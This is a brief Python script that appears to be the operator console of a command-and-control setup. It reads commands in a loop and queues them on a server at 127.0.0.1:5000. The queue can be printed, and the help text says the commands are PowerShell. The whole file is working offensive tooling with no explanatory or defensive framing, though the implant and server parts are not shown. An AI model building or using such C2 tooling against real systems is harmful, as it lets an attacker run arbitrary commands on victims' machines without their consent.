import requests 

c2_server = "http://127.0.0.1:5000"
path = "/secret"
def queue_cmd(cmd):
    r = requests.post(f"{c2_server}{path}", json=[cmd])
    if r.text == "True":
        print("queued ", cmd)
    else:
        print("failed")


def print_queue():
    r = requests.get(f"{c2_server}/queue")
    if r.status_code == 200:
        print(r.json())
    else:
        print("error")

        
def print_help():
    print(" run powershell commands ")

if __name__ == "__main__":
    while True:
        cmd = input(">>")
        if cmd == "help":
            print_help()
        elif cmd == "q":
            print_queue()
        elif cmd == "\n":
            continue
        else:
            queue_cmd(cmd)
